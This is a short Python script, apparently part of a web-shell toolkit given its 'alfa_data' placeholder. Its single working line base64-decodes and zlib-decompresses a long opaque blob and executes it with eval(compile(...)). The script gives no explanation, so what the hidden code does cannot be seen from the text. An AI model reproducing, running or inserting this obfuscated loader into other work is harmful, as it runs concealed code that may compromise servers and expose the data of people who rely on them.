#!/usr/bin/python
import zlib, base64
alfa_data='ALFA_DATA'
eval(compile(zlib.decompress(base64.b64decode("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")),'<string>','exec'))